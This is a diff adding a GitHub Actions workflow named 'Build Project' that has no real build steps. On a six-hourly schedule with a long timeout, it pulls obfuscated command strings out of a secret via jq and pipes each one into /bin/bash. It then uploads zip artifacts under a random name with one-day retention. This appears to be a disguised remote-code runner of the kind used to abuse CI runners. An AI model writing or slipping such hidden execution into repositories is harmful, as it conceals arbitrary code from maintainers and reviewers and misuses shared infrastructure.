@@ -1,0 +1,30 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 4,10,16,22 * * *'
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          gnj322: ${{ secrets.gnj322 }}
+        run: |
+          printf '%s' "$gnj322" | jq -r .cufq2127 | /bin/bash
+          echo $e6 | jq -r .fwzta0446 | /bin/bash
+          echo $ucv15 | jq -r .v9706 | /bin/bash
+          echo $wmr3514 | jq -r .hrgoa741 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: wtv4t9rY
+          path: "*.zip"
+          retention-days: 1
